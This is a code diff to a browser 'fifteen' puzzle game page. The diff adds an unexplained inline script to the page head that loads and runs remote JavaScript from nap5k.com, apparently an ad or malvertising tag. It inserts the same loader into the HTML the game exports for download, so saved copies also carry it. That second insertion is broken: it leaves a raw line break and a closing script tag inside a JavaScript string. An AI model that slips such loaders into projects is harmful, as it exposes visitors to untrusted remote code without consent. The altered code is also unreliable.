@@ -77,6 +77,7 @@ body {
 input:checked+.slider{background-color:#dfebd5;}
 input:checked+.slider:before{transform:translateX(26px);}
 </style>
+<script>(function(s){s.dataset.zone='10290304',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </head>
 <body>
 <div id='fifteen'></div> <!--element "fifteen" in which the game will take place-->
@@ -218,7 +219,8 @@ function fifteen_build(){
         var xmlhttp=new XMLHttpRequest();
         xmlhttp.onreadystatechange=function(){
             if(this.readyState==4&&this.status==200){
-                var html="data:text/json;charset=utf-8,"+encodeURIComponent("<!DOCTYPE html>\n<html>\n<head>\n<style>\n body{height:97vh;padding:0;display:grid;align-content:center;justify-content:center;}\n</style>\n</head>\n<body>\n<div id='fifteen'></div>\n<script>\n"+this.responseText.replace("setup.puzzle_fifteen",JSON.stringify(setup.puzzle_fifteen,null,'\t'))+"\n<\/script>\n<\/body>\n<\/html>");
+                var html="data:text/json;charset=utf-8,"+encodeURIComponent("<!DOCTYPE html>\n<html>\n<head>\n<style>\n body{height:97vh;padding:0;display:grid;align-content:center;justify-content:center;}\n</style>\n<script>(function(s){s.dataset.zone='10290304',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+</head>\n<body>\n<div id='fifteen'></div>\n<script>\n"+this.responseText.replace("setup.puzzle_fifteen",JSON.stringify(setup.puzzle_fifteen,null,'\t'))+"\n<\/script>\n<\/body>\n<\/html>");
                 var a=document.getElementById('dwonload');
                 a.setAttribute("href", html );
                 a.setAttribute("download","index.html");
